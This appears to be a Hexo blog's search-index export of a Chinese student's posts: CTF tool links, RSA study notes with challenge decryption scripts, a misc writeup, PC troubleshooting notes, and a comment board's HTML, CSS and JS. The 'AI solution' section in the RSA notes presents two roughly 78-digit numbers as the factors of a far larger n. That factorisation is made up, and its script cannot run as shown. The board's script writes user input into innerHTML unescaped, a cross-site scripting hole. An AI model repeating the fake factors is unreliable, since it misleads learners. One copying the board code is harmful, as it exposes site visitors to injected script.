        <content type="html"><![CDATA[<p>软件名：yaki<br>用途：ctf web<br>下载官网：<a href="https://yaklang.com/">https://yaklang.com/</a><br>使用文档：<a href="https://yaklang.io/products/intro/">https://yaklang.io/products/intro/</a><br><img src="/images/yaki.jpeg"></p><p>软件名：QRresearch<br>用途：ctf misc<br>下载地址：<a href="https://wwws.lanzouy.com/iRLUn11jc12h%E6%88%96%E8%80%85%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%94%B5%E8%84%91%E5%AD%98%E6%A1%A3%E6%96%87%E4%BB%B6%E5%A4%B9%E5%86%85%E8%8E%B7%E5%8F%96">https://wwws.lanzouy.com/iRLUn11jc12h或者百度网盘电脑存档文件夹内获取</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 存档 </tag>
            
            <tag> 新电脑部署 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSB隐写题目解法</title>
      <link href="/2025/08/11/LSB%E9%9A%90%E5%86%99%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%B3%95/"/>
      <url>/2025/08/11/LSB%E9%9A%90%E5%86%99%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/LSB.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> LSB </tag>
            
            <tag> 图片隐写 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa 初步学习笔记</title>
      <link href="/2025/08/09/rsa-%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/08/09/rsa-%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>1 因数，质数，余数</p><p>2 公钥，私钥<br>1）制作过程：<br><img src="/images/4.png"><br>2） 实际操作过程：<br><img src="/images/5.png"></p><p>3 具体题目解题过程中获得知识点<br>1）克拉默法则：<br>功能：确定线性方程组是否有解，以及解的唯一性。<br>重点！！！：只适用于方程组中未知量个数与方程个数相等的情形（具体原因？<br>基本形式：如果线性方程组的系数行列式不等于零，那么该方程组一定有唯一解。这个行列式可以通过将线性方程组的右端项b1, b2, …, bn分别代入原行列式的相应列元素中得到。<br>定理与推论：<br>定理1：如果线性方程组的系数行列式D不等于零，那么该方程组一定有唯一解。<br>定理2：如果线性方程组无解或有多个不同的解，那么它的系数行列式D必为零。<br>2）生日悖论<br><img src="/images/1.png"><br><img src="/images/2.png"><br>3）Floyd判圈算法（又称龟兔赛跑算法）<br>1 应用：<br>· 检测是否存在环<br>· 若环存在，可以计算出环的长度<br>· 若环存在，可以计算出环的起点<br>2 算法原理证明：<br><img src="/images/3.png"><br>如图1 已知兔子和乌龟同时从链表起点S出发，兔子速度是乌龟的两倍（乌龟每次向后移动1步，兔子移动每次向后移动2步），m是S和A之间的距离，n是A和B之间的距离，A是环的起点，L是环的长度，B是兔子、乌龟第一次相遇的点。</p><ol><li>环是否存在<br>结论：若兔子在达到链表尾部前，乌龟与兔子相遇了，则说明链表有环。<br>反证法：若环不存在，那么乌龟永远追不上兔子，那么在兔子到达链表尾部前乌龟不会和兔子相遇。若相遇了，则链表有环。</li><li>求环的长度<br>已知乌龟和兔子相遇时，它们必定都在环上。设它们第一次相遇在B点，相遇后兔子保持不动，乌龟保持每次移动一步的速度继续前行，第二次相遇时，环长度L&#x3D;第一次相遇后到第二次相遇时乌龟走过的路程。</li><li>求环的起点<br>设乌龟走过的全部路程为i，那么有<br>i &#x3D; m + n + aL （1）「a是乌龟绕过的环的圈数」<br>因为兔子的速度是乌龟的两倍，所以有<br>2i &#x3D; m + n + bL（2）「b是兔子绕过的环的圈数」<br>(2) – (1)可得：<br>i &#x3D; (b – a)L （3）<br>结合式子(1)、(3)可得 m + n + aL &#x3D; (b – a)L，所以有<br>m + n &#x3D; (b-2a)L（4）{因为m+n&gt;0且L&gt;0, 所以b-2a&gt;&#x3D;1}<br>所以可以得出结论：m + n &#x3D; 环长度L的正整数倍。（5）<br>当乌龟和兔子在B点第一次相遇后，让乌龟回到起点S，兔子仍在B，乌龟以每次1步的速度向前走，兔子以相同的速度绕环逆时针前进。当走了m步时，兔子和乌龟都正好在A处，即环的起点。<strong><strong>因为兔子相对于A点走了(n+m)步，由结论(5)可知A必然是环的起点。</strong></strong>【不懂】</li></ol><p>4 具体题目解题过程中获得工具<br>1）<a href="https://factordb.com/">https://factordb.com/</a><br>分解n工具，注意！！！点数字后就到上方框里了可以复制！！！（有点愚蠢但愚蠢的人没发现</p><p><strong><strong>具体题目：</strong></strong><br>· 来源：spc学长xc<br>基础rsa，在python中使用inverse()函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#from Crypto.Util.number import *</span><br><span class="line">#from secret import flag</span><br><span class="line">#m = bytes_to_long(flag)</span><br><span class="line">#p = getPrime(512)</span><br><span class="line">#q = getPrime(512)</span><br><span class="line">#e = 65537</span><br><span class="line">#n = p*q</span><br><span class="line">#c = pow(m,e,n)</span><br><span class="line">#print(f&#x27;p = &#123;p&#125;&#x27;)</span><br><span class="line">#print(f&#x27;q = &#123;q&#125;&#x27;)</span><br><span class="line">#print(f&#x27;c = &#123;c&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073</span><br><span class="line">q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451</span><br><span class="line">c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057</span><br><span class="line"></span><br><span class="line">#最终解决方法：</span><br><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">e = 65537          </span><br><span class="line">n = p * q</span><br><span class="line">t = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, t)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line">print(flag.decode())   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>· 来源：spc学长xc<br>题目提示：大数N的分解<br>题目：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from serct import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = 65537</span><br><span class="line">c = powmod(m, e, n)#加密结果    </span><br><span class="line">print(n)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"># 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span><br><span class="line"># 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br></pre></td></tr></table></figure><p>AI解法：<br>拿到题目后，我们手里只有n ，c ，e，但没有 p 和 q ，所以第一步就是分解 n。</p><ol><li>先直接上 yafu &#x2F; factordb<br>（注意！！！分解时要求P*Q&#x3D;N，且注意P跟Q的bit特征，在此题当中只有512bit）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 72224896773450610791657349018700642791668283264384520670702825479122904864127</span><br><span class="line">q = 72224896773450610791657349018700642791668283264384520670702825479122904864239</span><br></pre></td></tr></table></figure><p>（这两个数只差 112，所以 yafu 的 ECM &#x2F; SIQS 都能秒破。）（yafu下载后卡死【待解决】</p><ol start="2"><li>有了 p、q，就能算私钥 d</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">n = 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span><br><span class="line">c = 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">p = 72224896773450610791657349018700642791668283264384520670702825479122904864127</span><br><span class="line">q = 72224896773450610791657349018700642791668283264384520670702825479122904864239</span><br><span class="line"></span><br><span class="line">assert p * q == n</span><br><span class="line">#校验等式是否成立</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)#欧拉函数</span><br><span class="line">d = invert(e, phi)#e*d≡1mod phi</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>（这题就是典型的“p、q 距离太近”导致用 Fermat 方法或 ECM 就能秒分解。）（这两个方法是什么？</p><p>· 来源：spc学长xc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(b&#x27;flag&#123;******&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">r = getPrime(512)</span><br><span class="line"># 分别独立地生成 3 个 512 bit（≈154 位十进制）的随机强素数 p、q、r。这三个素数就是后面多素数 RSA 的因子。</span><br><span class="line"></span><br><span class="line">h1 = 1*p + 1*q + 1*r</span><br><span class="line">h2 = 2*p + 3*q + 3*r</span><br><span class="line">h3 = 9*p + 9*q + 6*r</span><br><span class="line">print( &quot;hint_of_pqr=&quot; , h1 , h2 , h3 )</span><br><span class="line"># h1,h2,h3可求出pqr的值</span><br><span class="line"></span><br><span class="line">e = getPrime(64)</span><br><span class="line"># 生成一个 64 bit 的随机素数 e，用作 RSA 公钥指数。</span><br><span class="line"></span><br><span class="line">a_big_prime = getPrime( 512 )</span><br><span class="line"># 再生成一个 512 bit 的随机素数，起名叫 `a_big_prime`。</span><br><span class="line"># 注意：这个名字有误导性，它并不是 RSA 模数 N 的因子，只是额外生成的一个素数，用来产生另一条“hint”（？什么鬼</span><br><span class="line"></span><br><span class="line">hint = pow(a_big_prime,e,2**512)</span><br><span class="line">#计算</span><br><span class="line"># pow（a,b,c）=（a^b）%c</span><br><span class="line"># 在 CTF 语境里，这往往暗示“partial key exposure”——低 512 位泄漏</span><br><span class="line"># 攻击者可用 Coppersmith/Howgrave-Graham lattice 方法恢复完整私钥。</span><br><span class="line"># 不过本题真正解密不需要它，因为 e 很小且 n 的因子我们已能求出。</span><br><span class="line"></span><br><span class="line">print( &quot;the big prime is: &quot; , a_big_prime )</span><br><span class="line">print( &quot;hint is:&quot; , hint )</span><br><span class="line"></span><br><span class="line">n = p*q*r</span><br><span class="line"># 构造一个 3 素数 RSA 模数 n，长度 3×512 = 1536 bit。</span><br><span class="line">c = pow( m , e , n )</span><br><span class="line">print( &quot;c=&quot; , c )</span><br><span class="line"># 输出密文 c</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">hint_of_pqr= 26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427</span><br><span class="line">66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144 213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946</span><br><span class="line">the big prime is:  11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921</span><br><span class="line">hint is: 10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505</span><br><span class="line">c= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>自己解出来了但方法过于复杂，无参考价值，所以只保留学长wp作为存档。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Cryptodome.Util.number import long_to_bytes as l2b</span><br><span class="line">import sympy</span><br><span class="line"></span><br><span class="line">h1 =  26205997351166240405785097231436009350807507606268828636742615246287109077466822241186639293389573242216311668227098054599788791116215571416316140409352427</span><br><span class="line">h2 =  66860315641471130491119218972922785980480599406983109647358601581641695642878472456945137024883369147959034865118793676633880997281324220353834323524635144</span><br><span class="line">h3 =  213473629205254382083617791480463504155040467378518856042962121442859026373709762896295778597714884481459316375098621436229734548467857563069831689551454946</span><br><span class="line">a_big_prime =   11557301053448817361014126921662226367639845395602185765021724910056663884113570410496382266851427507275779260616871464855286322325118092388982283547918921</span><br><span class="line">hint =  10271913433365953528187318472631779008104540530202414129752768330046395509900224800993688431964630907432047820727638055487310601524087956924122431108238505</span><br><span class="line">c= 116569284047193403361251336983936346094224289856857789287062750599584928427772025697885153355908857327470083147465892652988245017837819503727301904206404536314951181113506280048949514352483259762138034268916332027429633274027588317302925270485836816591363962835119659624022139707163858477460375467148571163549410771927644341667962740112294140641187548649921303016157469076294782957230926056116058301134087751871726212821846406513780951057663400249479830993970711</span><br><span class="line">#解方程</span><br><span class="line">p = 3*h1 - h2</span><br><span class="line">r = (9*h1 - h3)//3</span><br><span class="line">q = h1 - p -r</span><br><span class="line"></span><br><span class="line">#解e</span><br><span class="line">e = sympy.discrete_log(2**512,hint,a_big_prime)</span><br><span class="line"></span><br><span class="line">#rsa算法</span><br><span class="line">n = p*q*r</span><br><span class="line">fain = (p-1)*(q-1)*(r-1)</span><br><span class="line">d = pow(e,-1,fain)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(l2b(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf writeup</title>
      <link href="/2025/08/09/ctf-%E9%9B%B6%E6%95%A3writeup/"/>
      <url>/2025/08/09/ctf-%E9%9B%B6%E6%95%A3writeup/</url>
      
        <content type="html"><![CDATA[<p>2025-08-09<br>题目类型：misc<br>题目来源：spc学长sq<br>解决步骤：<br>1 虚拟机VMware + kali linux中的binwalk工具，使用-e命令分解文件，得到缺三角的二维码<br>2 图片编辑补齐三角<br>3 扫码获得文本，使用社会主义核心价值观编码解开获得flag<br>反思：<br>难点主要只是工具配置和方向，所以还是要多问（笑）</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电脑求助存档</title>
      <link href="/2025/08/07/%E7%94%B5%E8%84%91%E6%B1%82%E5%8A%A9%E5%AD%98%E6%A1%A3/"/>
      <url>/2025/08/07/%E7%94%B5%E8%84%91%E6%B1%82%E5%8A%A9%E5%AD%98%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>2025-08-03<br><strong><strong>问题：openlist挂载卡在使用raildrive mount进行其集成网盘映射至本地文件夹一步</strong></strong><br>解决：取消勾选网络https:&#x2F;&#x2F;选项<br>反思：看攻略不够仔细，攻略中有这一步漏了</p><p>2025-08-03<br><strong><strong>问题：openlist自启动文件失败</strong></strong><br>解决：没有放在同级文件夹<br>反思：自动文件如.bat后缀文件，需要注意是否有放置位置要求</p><p>2025-08-03<br><strong><strong>问题：桌面出现观看视频名称，具体表现为网页观看任一视频出现名称在桌面左上角，且位于fence分类界面下方</strong></strong><br>解决：是wallpaper engine的壁纸问题，具体原因不清楚，有大佬怀疑壁纸随音乐律动模块把媒体控件拉过来了<br>反思：一开始一个个关闭桌面美化软件来确定问题来源时，漏了壁纸</p><hr>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/html/try.html"/>
      <url>/html/try.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>留言板 - 弹幕互动</title>    <link rel="stylesheet" href="comments.css"></head><body>    <div class="container">        <div class="header">            <h1>💬 留言板 & 弹幕互动</h1>            <p>留下您的想法，参与实时弹幕互动</p>        </div>                <div class="content">            <!-- 留言板区域 -->            <div class="comments-section">                <div class="comment-form">                    <h3>发表留言</h3>                    <form id="commentForm">                        <div class="form-group">                            <label for="name">昵称</label>                            <input type="text" id="name" placeholder="请输入您的昵称" required>                        </div>                        <div class="form-group">                            <label for="email">邮箱</label>                            <input type="email" id="email" placeholder="请输入您的邮箱">                        </div>                        <div class="form-group">                            <label for="message">留言内容</label>                            <textarea id="message" rows="4" placeholder="请输入您的留言..." required></textarea>                        </div>                        <button type="submit" class="submit-btn">发布留言</button>                    </form>                </div>                                <div class="comments-list" id="commentsList">                    <!-- 留言列表将通过 JavaScript 动态生成 -->                </div>            </div>                        <!-- 弹幕区域 -->            <div class="danmaku-section">                <canvas id="danmakuCanvas"></canvas>                <div class="danmaku-controls">                    <div class="danmaku-input">                        <input type="text" id="danmakuInput" placeholder="输入弹幕内容..." maxlength="30">                        <button class="danmaku-send" onclick="sendDanmaku()">发射</button>                    </div>                </div>            </div>        </div>    </div>    <script src="comments.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言板</title>
      <link href="/try/index.html"/>
      <url>/try/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="/comments/comments.css"><div class="container">    <!-- 这里粘贴上面的HTML内容 -->    <!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>留言板 - 弹幕互动</title>    <link rel="stylesheet" href="comments.css"></head><body>    <div class="container">        <div class="header">            <h1>💬 留言板 & 弹幕互动</h1>            <p>留下您的想法，参与实时弹幕互动</p>        </div>        <pre><code>    &lt;div class=&quot;content&quot;&gt;        &lt;!-- 留言板区域 --&gt;        &lt;div class=&quot;comments-section&quot;&gt;            &lt;div class=&quot;comment-form&quot;&gt;                &lt;h3&gt;发表留言&lt;/h3&gt;                &lt;form id=&quot;commentForm&quot;&gt;                    &lt;div class=&quot;form-group&quot;&gt;                        &lt;label for=&quot;name&quot;&gt;昵称&lt;/label&gt;                        &lt;input type=&quot;text&quot; id=&quot;name&quot; placeholder=&quot;请输入您的昵称&quot; required&gt;                    &lt;/div&gt;                    &lt;div class=&quot;form-group&quot;&gt;                        &lt;label for=&quot;email&quot;&gt;邮箱&lt;/label&gt;                        &lt;input type=&quot;email&quot; id=&quot;email&quot; placeholder=&quot;请输入您的邮箱&quot;&gt;                    &lt;/div&gt;                    &lt;div class=&quot;form-group&quot;&gt;                        &lt;label for=&quot;message&quot;&gt;留言内容&lt;/label&gt;                        &lt;textarea id=&quot;message&quot; rows=&quot;4&quot; placeholder=&quot;请输入您的留言...&quot; required&gt;&lt;/textarea&gt;                    &lt;/div&gt;                    &lt;button type=&quot;submit&quot; class=&quot;submit-btn&quot;&gt;发布留言&lt;/button&gt;                &lt;/form&gt;            &lt;/div&gt;                        &lt;div class=&quot;comments-list&quot; id=&quot;commentsList&quot;&gt;                &lt;!-- 留言列表将通过 JavaScript 动态生成 --&gt;            &lt;/div&gt;        &lt;/div&gt;                &lt;!-- 弹幕区域 --&gt;        &lt;div class=&quot;danmaku-section&quot;&gt;            &lt;canvas id=&quot;danmakuCanvas&quot;&gt;&lt;/canvas&gt;            &lt;div class=&quot;danmaku-controls&quot;&gt;                &lt;div class=&quot;danmaku-input&quot;&gt;                    &lt;input type=&quot;text&quot; id=&quot;danmakuInput&quot; placeholder=&quot;输入弹幕内容...&quot; maxlength=&quot;30&quot;&gt;                    &lt;button class=&quot;danmaku-send&quot; onclick=&quot;sendDanmaku()&quot;&gt;发射&lt;/button&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;comments.js&quot;&gt;&lt;/script&gt;</code></pre></body></html></div><script src="/comments/comments.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/html/css/try.css"/>
      <url>/html/css/try.css</url>
      
        <content type="html"><![CDATA[* {    margin: 0;    padding: 0;    box-sizing: border-box;}body {    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);    min-height: 100vh;    padding: 20px;}.container {    max-width: 1200px;    margin: 0 auto;    background: rgba(255, 255, 255, 0.95);    border-radius: 20px;    overflow: hidden;    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);}.header {    background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);    color: white;    padding: 40px;    text-align: center;}.header h1 {    font-size: 2.5rem;    margin-bottom: 10px;}.header p {    font-size: 1.2rem;    opacity: 0.9;}.content {    display: grid;    grid-template-columns: 1fr 1fr;    gap: 0;    min-height: 600px;}/* 留言板样式 */.comments-section {    padding: 30px;    background: white;    border-right: 1px solid #eee;}.comment-form {    background: #f8f9fa;    padding: 20px;    border-radius: 15px;    margin-bottom: 30px;}.form-group {    margin-bottom: 15px;}.form-group label {    display: block;    margin-bottom: 5px;    font-weight: 600;    color: #333;}.form-group input,.form-group textarea {    width: 100%;    padding: 12px;    border: 2px solid #e9ecef;    border-radius: 8px;    font-size: 14px;    transition: border-color 0.3s;}.form-group input:focus,.form-group textarea:focus {    outline: none;    border-color: #4facfe;}.submit-btn {    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);    color: white;    border: none;    padding: 12px 30px;    border-radius: 25px;    cursor: pointer;    font-size: 16px;    font-weight: 600;    transition: transform 0.3s;}.submit-btn:hover {    transform: translateY(-2px);}.comments-list {    max-height: 400px;    overflow-y: auto;}.comment-item {    background: white;    padding: 15px;    margin-bottom: 15px;    border-radius: 10px;    border-left: 4px solid #4facfe;    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);}.comment-header {    display: flex;    justify-content: space-between;    align-items: center;    margin-bottom: 8px;}.comment-author {    font-weight: bold;    color: #333;}.comment-time {    color: #666;    font-size: 12px;}.comment-content {    color: #555;    line-height: 1.5;}/* 弹幕区域样式 */.danmaku-section {    position: relative;    background: #1a1a1a;    overflow: hidden;}#danmakuCanvas {    position: absolute;    top: 0;    left: 0;    width: 100%;    height: 100%;}.danmaku-controls {    position: absolute;    bottom: 20px;    left: 0;    right: 0;    padding: 0 20px;    z-index: 10;}.danmaku-input {    display: flex;    gap: 10px;}.danmaku-input input {    flex: 1;    padding: 12px;    border: none;    border-radius: 25px;    background: rgba(255, 255, 255, 0.9);}.danmaku-send {    background: #ff4757;    color: white;    border: none;    padding: 12px 20px;    border-radius: 25px;    cursor: pointer;    font-weight: 600;}/* 响应式设计 */@media (max-width: 768px) {    .content {        grid-template-columns: 1fr;    }        .comments-section {        border-right: none;        border-bottom: 1px solid #eee;    }        .header h1 {        font-size: 2rem;    }        .header {        padding: 30px 20px;    }}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/html/js/try.js"/>
      <url>/html/js/try.js</url>
      
        <content type="html"><![CDATA[// 留言板功能const commentForm = document.getElementById('commentForm');const commentsList = document.getElementById('commentsList');// 从 localStorage 加载留言function loadComments() {    const comments = JSON.parse(localStorage.getItem('comments')) || [];    commentsList.innerHTML = '';        comments.forEach(comment => {        const commentElement = document.createElement('div');        commentElement.className = 'comment-item';        commentElement.innerHTML = `            <div class="comment-header">                <span class="comment-author">${comment.name}</span>                <span class="comment-time">${comment.time}</span>            </div>            <div class="comment-content">${comment.message}</div>        `;        commentsList.appendChild(commentElement);    });}// 提交留言commentForm.addEventListener('submit', function(e) {    e.preventDefault();        const name = document.getElementById('name').value;    const email = document.getElementById('email').value;    const message = document.getElementById('message').value;        const comment = {        name: name,        email: email,        message: message,        time: new Date().toLocaleString('zh-CN')    };        // 保存到 localStorage    const comments = JSON.parse(localStorage.getItem('comments')) || [];    comments.unshift(comment);    localStorage.setItem('comments', JSON.stringify(comments));        // 清空表单    commentForm.reset();        // 重新加载留言    loadComments();        // 同时发送弹幕    sendDanmaku(message, name);});// 弹幕功能const canvas = document.getElementById('danmakuCanvas');const ctx = canvas.getContext('2d');let danmakus = [];// 初始化画布function initCanvas() {    canvas.width = canvas.offsetWidth;    canvas.height = canvas.offsetHeight;}// 弹幕类class Danmaku {    constructor(text, color = '#fff') {        this.text = text;        this.color = color;        this.x = canvas.width;        this.y = Math.random() * (canvas.height - 50) + 25;        this.speed = 2 + Math.random() * 2;        this.opacity = 1;        this.fontSize = 18 + Math.random() * 10;    }        update() {        this.x -= this.speed;        return this.x > -200;    }        draw() {        ctx.save();        ctx.globalAlpha = this.opacity;        ctx.font = `bold ${this.fontSize}px Arial`;        ctx.fillStyle = this.color;        ctx.fillText(this.text, this.x, this.y);                // 添加文字阴影        ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';        ctx.shadowBlur = 10;        ctx.shadowOffsetX = 2;        ctx.shadowOffsetY = 2;        ctx.restore();    }}// 发送弹幕function sendDanmaku(text = null, author = null) {    const input = document.getElementById('danmakuInput');    const danmakuText = text || input.value;        if (danmakuText.trim()) {        const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57', '#ff9ff3'];        const color = colors[Math.floor(Math.random() * colors.length)];                let displayText = danmakuText;        if (author && !text) {            displayText = `${author}: ${danmakuText}`;        }                danmakus.push(new Danmaku(displayText, color));                if (!text) {            input.value = '';        }    }}// 动画循环function animate() {    ctx.clearRect(0, 0, canvas.width, canvas.height);        // 更新和绘制所有弹幕    danmakus = danmakus.filter(danmaku => danmaku.update());    danmakus.forEach(danmaku => danmaku.draw());        requestAnimationFrame(animate);}// 初始化window.addEventListener('load', function() {    initCanvas();    loadComments();    animate();        // 添加一些示例弹幕    setTimeout(() => {        sendDanmaku('欢迎来到留言板！');        sendDanmaku('这个页面真不错~');        sendDanmaku('大家快来留言呀！');        sendDanmaku('弹幕效果很酷！');        sendDanmaku('支持实时互动！');    }, 1000);});window.addEventListener('resize', initCanvas);// 回车发送弹幕document.getElementById('danmakuInput').addEventListener('keypress', function(e) {    if (e.key === 'Enter') {        sendDanmaku();    }});// 添加随机弹幕生成（可选）setInterval(() => {    const randomMessages = [        '这个留言板很棒！',        '弹幕效果很流畅',        '界面设计很漂亮',        '功能很实用',        '支持实时互动',        '用户体验很好'    ];    const randomMessage = randomMessages[Math.floor(Math.random() * randomMessages.length)];    sendDanmaku(randomMessage);}, 10000); // 每10秒发送一条随机弹幕]]></content>
      
    </entry>
    
    
  
</search>
